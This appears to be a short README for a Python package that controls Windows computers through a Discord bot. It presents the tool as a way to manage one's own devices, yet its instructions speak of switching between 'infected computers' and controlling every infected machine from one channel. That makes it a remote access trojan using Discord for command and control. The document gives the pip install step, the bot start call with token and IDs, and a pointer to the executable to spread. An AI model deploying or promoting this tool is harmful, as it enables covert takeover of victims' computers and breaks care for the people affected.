It allows you to manage and interact with your own Windows devices remotely using a simple Discord-based interface.

## Installation  
First create a discord bot and add it to your new made empty discord channel

pip install worldnex

import nex  

nex.start("BOT_TOKEN", UserID = DISCORD_USER_ID, ServerID = DISCORD_SERVER_ID)  

Once the bot is online, type `access` in different Discord channels to switch between the infected computers(main channel has access to ever single infected computer).

type `!h` in to see all available commands. 

and use the file exe file in the dist folder.
